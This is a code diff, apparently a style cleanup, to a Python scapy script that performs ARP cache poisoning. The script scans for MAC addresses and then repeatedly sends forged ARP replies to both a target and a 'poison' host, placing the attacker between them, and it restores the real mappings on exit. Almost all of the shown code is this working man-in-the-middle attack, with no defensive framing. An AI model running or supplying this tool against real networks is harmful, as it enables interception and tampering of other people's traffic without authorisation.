@@ -9,9 +9,12 @@ from scapy.all import *
 def get_user_params():
     """Get User paramaters."""
     parser = argparse.ArgumentParser()
-    parser.add_argument('-i', '--ipaddress', dest='ipaddress', help='Enter ip address or Net')
-    parser.add_argument('-t', '--target', dest='targetip', help='Enter target address or Net')
-    parser.add_argument('-p', '--poison', dest='poisonip', help='Enter poison ip address or Net')
+    parser.add_argument('-i', '--ipaddress', dest='ipaddress',
+                        help='Enter ip address or Net')
+    parser.add_argument('-t', '--target', dest='targetip',
+                        help='Enter target address or Net')
+    parser.add_argument('-p', '--poison', dest='poisonip',
+                        help='Enter poison ip address or Net')
     result = parser.parse_args()
     return result
 
@@ -21,8 +24,10 @@ def get_scan_mac(ipornet, onlyone=False, shell=False, summary=False):
     ether = Ether(dst='ff:ff:ff:ff:ff:ff')
     packet = ether / arp
     rcvList, plist = srp(packet, timeout=4, verbose=shell)
-    if summary: rcvList.summary()
-    if onlyone: return rcvList[0][1].src
+    if summary:
+        rcvList.summary()
+    if onlyone:
+        return rcvList[0][1].src
     return None
 
 
@@ -35,10 +40,11 @@ my_mac = target_mac = poison_mac = None
 
 def set_poison(targetip, poisonip, shell=False, reset=False):
     global my_mac, target_mac, poison_mac
-    if not my_mac or reset: my_mac = get_if_hwaddr(conf.iface)
-    if not target_mac or reset: target_mac = get_mac(targetip)
-    if not poison_mac or reset: poison_mac = get_mac(poisonip)
-    arp = ARP(op=2, hwsrc=target_mac if reset else my_mac, psrc=targetip, hwdst=poison_mac, pdst=poisonip)
+    my_mac = get_if_hwaddr(conf.iface)
+    target_mac = get_mac(targetip)
+    poison_mac = get_mac(poisonip)
+    arp = ARP(op=2, hwsrc=target_mac if reset else my_mac,
+              psrc=targetip, hwdst=poison_mac, pdst=poisonip)
     plist = send(arp, verbose=shell)
 
 
@@ -52,7 +58,8 @@ if args.targetip and args.poisonip:
             set_poison(args.targetip, args.poisonip)
             set_poison(args.poisonip, args.targetip)
             poison_packet_counter += 1
-            print('\rPoison packet sended ' + str(poison_packet_counter), end="")
+            print('\rPoison packet sended ' +
+                  str(poison_packet_counter), end="")
             time.sleep(3)
     except KeyboardInterrupt:
         set_poison(args.targetip, args.poisonip, reset=True)
